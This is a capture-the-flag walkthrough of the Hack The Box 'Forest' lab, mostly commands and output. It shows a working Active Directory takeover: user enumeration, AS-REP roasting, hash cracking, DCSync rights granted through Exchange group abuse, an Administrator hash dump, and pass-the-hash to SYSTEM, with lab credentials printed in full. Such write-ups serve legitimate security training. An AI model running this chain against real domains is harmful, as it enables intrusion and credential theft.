# Forest

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV -T4 10.10.10.161     
[sudo] password for kali: 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-11-07 13:56 EST
Nmap scan report for 10.10.10.161
Host is up (0.14s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-07 19:03:16Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-11-07T11:03:24-08:00
| smb2-time: 
|   date: 2025-11-07T19:03:25
|_  start_date: 2025-11-07T19:02:07
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h46m51s, deviation: 4h37m09s, median: 6m50s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ kerbrute userenum -d htb.local /usr/share/wordlists/statistically-likely-usernames/john.txt --dc 10.10.10.161 | awk -F: '{print $4}' 

         mark@htb.local
         andy@htb.local
         sebastien@htb.local
         lucinda@htb.local
         santi@htb.local
```

It was enough, but we were able to enumerate users with nxc

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb 10.10.10.161 -u '' -p '' --users               
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.10.10.161    445    FOREST           [+] htb.local\\: 
SMB         10.10.10.161    445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.161    445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain 
SMB         10.10.10.161    445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.161    445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account 
SMB         10.10.10.161    445    FOREST           DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.10.10.161    445    FOREST           $331000-VK4ADACQNUCA          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_2c8eef0a09b545acb          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_75a538d3025e4db9a          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_681f53d4942840e18          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_1b41c9286325456bb          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_9b69f1b9d2cc45549          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_7c96b981967141ebb          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_c75ee099d0a64c91b          <never>             0        
SMB         10.10.10.161    445    FOREST           SM_1ffab36a2f5f479cb          <never>             0        
SMB         10.10.10.161    445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0        
SMB         10.10.10.161    445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0        
SMB         10.10.10.161    445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0        
SMB         10.10.10.161    445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0        
SMB         10.10.10.161    445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0        
SMB         10.10.10.161    445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0        
SMB         10.10.10.161    445    FOREST           sebastien                     2019-09-20 00:29:59 0        
SMB         10.10.10.161    445    FOREST           lucinda                       2019-09-20 00:44:13 0        
SMB         10.10.10.161    445    FOREST           svc-alfresco                  2025-11-07 19:16:19 0        
SMB         10.10.10.161    445    FOREST           andy                          2019-09-22 22:44:16 0        
SMB         10.10.10.161    445    FOREST           mark                          2019-09-20 22:57:30 0        
SMB         10.10.10.161    445    FOREST           santi                         2019-09-20 23:02:55 0        
SMB         10.10.10.161    445    FOREST           [*] Enumerated 31 local users: HTB
```

We made a user list and checked for asreproast

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb 10.10.10.161 -u '' -p '' --users | awk '{print $5}'
[*]
[+]
-Username-
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

We get a hash for the user svc-alfresco

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile forest
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:04bd9e997760d08bb5bd2604968d70fa$d4072bac42b38178832181815180fdc6e71ec86add5f9e42e1f34a8e1a19c83e4532cf132d5d0ec4cbaf87a97d3201a973903d64e654146618c9f0df567d991dab2fe2a9cf8b7961fd121579acd40c01cf4642a658de6483904cb35096acf166a76c97c4185bc70190e6537b295f92779d5a1e145ee4797731fc74bdefe0144e3e9b9d2346b5388c8d8ccd64548751f2d7ecb1caa051bdce8359c6daab4749e64df50a0a0a5793f855a1d57b912e6bddb3c04c04a4c363896448ff12931a7031bb2d1c7525671cc33dca151af1c8d406695f0d73f7a48efd6bb75f745cdf70cc261f7656267d
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We crack the hash

```bash
svc-alfresco:s3rvice
```

We check the creds

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb forest.htb.local -u 'svc-alfresco' -p 's3rvice'    
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.10.10.161    445    FOREST           [+] htb.local\\svc-alfresco:s3rvice 
                                                                                       
```

We also try for winrm : he has admin privs

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc winrm forest.htb.local -u 'svc-alfresco' -p 's3rvice'                 
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)
```

We can login with evil-winrm

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i forest.htb.local -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FpWTkcwwOBE0qUP2lCC0K%2Fimage.png?alt=media&#x26;token=c9f5198f-e95e-47ee-8864-e5122dfaafcb" alt=""><figcaption></figcaption></figure>

Add our user to the Exchange Windows Permissions group

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d htb.local --host 10.10.10.161 -u svc-alfresco -p 's3rvice' add groupMember 'Exchange Windows Permissions' svc-alfresco
[+] svc-alfresco added to Exchange Windows Permissions
```

Check that it was successful

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d htb.local --host 10.10.10.161 -u svc-alfresco -p 's3rvice' get object 'Exchange Windows Permissions'

distinguishedName: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
cn: Exchange Windows Permissions
dSCorePropagationData: 2025-11-07 19:36:01+00:00
description: This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
garbageCollPeriod: 1209600
groupType: -2147483640
instanceType: 4
internetEncoding: 0
member: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local; CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
```

We can now modify the ACL to the domain. We can give our user DCSync privs. In the command, we can obtain the target-dn of the domain by looking at bloodhound

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.10.10.161
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251107-143847.bak
[*] DACL modified successfully!
```

We can now use secretsdump to DCSync

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'forest.htb.local'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

Next pass the hash and login as SYSTEM

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-psexec htb.local/administrator@forest.htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on forest.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file RVwtNTJM.exe
[*] Opening SVCManager on forest.htb.local.....
[*] Creating service eKgD on forest.htb.local.....
[*] Starting service eKgD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami 
nt authority\\system
```
